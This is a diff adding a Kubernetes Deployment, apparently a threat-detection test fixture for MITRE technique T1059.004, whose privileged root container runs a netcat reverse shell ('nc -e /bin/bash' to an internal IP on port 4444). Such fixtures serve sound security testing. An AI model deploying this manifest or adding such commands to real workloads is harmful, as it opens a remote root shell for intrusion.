@@ -1,0 +1,27 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: netcat-execution-t1059-004
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: netcat-execution-t1059-004
+  template:
+    metadata:
+      labels:
+        app: netcat-execution-t1059-004
+    spec:
+      containers:
+      - name: netcat-execution-t1059-004
+        image: qualysdockerhub/overlay-functional:threatqatest
+        command:
+          - /bin/sh
+          - -c
+        args:
+        - nc -e /bin/bash 10.113.107.226 4444; sleep infinity
+        securityContext:
+          runAsUser: 0
+          runAsGroup: 0
+          allowPrivilegeEscalation: true
+          privileged: true
